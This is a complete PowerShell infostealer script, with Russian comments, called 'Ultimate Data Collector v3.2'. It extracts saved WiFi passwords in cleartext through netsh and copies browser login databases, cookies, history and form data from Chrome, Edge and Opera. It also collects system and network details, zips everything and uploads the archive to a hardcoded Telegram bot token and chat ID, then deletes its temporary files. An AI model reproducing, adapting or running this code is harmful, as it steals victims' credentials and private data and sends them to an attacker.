<#
.SYNOPSIS
    Ultimate Data Collector v3.2
.DESCRIPTION
    Полностью автономный сбор всех данных с компьютера
#>

# Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
    } catch { 
        Start-Sleep -Seconds 5
        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
    }
}

function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { 
        Start-Sleep -Seconds 5
        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
    }
}

# 1. Сбор WiFi паролей (исправленная версия)
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
    $result = @("=== WiFi Passwords ===")
    
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
                netsh wlan export profile name="`"$profile`"" key=clear folder="$TEMP_DIR" | Out-Null
                
                if (Test-Path $xmlFile) {
                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                    $result += "METHOD: netsh"
                    $result += "SSID: $profile"
                    $result += "Password: $password"
                    $result += "----------------"
                }
            } catch {
                $errorMsg = "Error with profile $profile : $($_.Exception.Message)"
                $result += $errorMsg
            }
        }
    } catch {
        $result += "Netsh method error: $($_.Exception.Message)"
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# 2. Сбор данных браузеров
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.txt"
    $result = @("=== Browser Data ===")
    
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" },
        @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\" }
    )
    
    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
                New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
                
                $files = @("Login Data", "History", "Cookies", "Web Data")
                foreach ($file in $files) {
                    $fullPath = Join-Path $browser.Path $file
                    if (Test-Path $fullPath) {
                        Copy-Item $fullPath $browserDir -Force -ErrorAction SilentlyContinue
                    }
                }
                
                $result += "$($browser.Name): Data copied successfully"
            }
        } catch {
            $result += "$($browser.Name) error: $($_.Exception.Message)"
        }
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return (Get-ChildItem $TEMP_DIR\*_Data).FullName
}

# 3. Сбор системной информации
function Get-SystemData {
    $outputFile = "$TEMP_DIR\system_info.txt"
    
    $result = @(
        "=== System Information ===",
        "Computer Name: $env:COMPUTERNAME",
        "Username: $env:USERNAME",
        "OS Version: $([System.Environment]::OSVersion.VersionString)",
        "Network Info:",
        (ipconfig /all | Out-String),
        "Active Connections:",
        (netstat -ano | Out-String)
    )
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# Основной сбор
try {
    Send-ToTelegram -Text "[START] Data collection started on $env:COMPUTERNAME ($env:USERNAME)"
    
    $wifiFile = Get-WiFiPasswords
    $browserFiles = Get-BrowserData
    $systemFile = Get-SystemData
    
    $zipFile = "$env:TEMP\FULL_DATA_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    $allFiles = @($wifiFile, $systemFile) + $browserFiles | Where-Object { $_ -ne $null }
    Compress-Archive -Path $allFiles -DestinationPath $zipFile -CompressionLevel Optimal -Force
    
    Send-FileToTelegram -FilePath $zipFile
    Send-ToTelegram -Text "[SUCCESS] Data collection completed. Archive: $(Split-Path $zipFile -Leaf)"
}
catch {
    Send-ToTelegram -Text "[ERROR] Data collection failed: $($_.Exception.Message)"
}
finally {
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
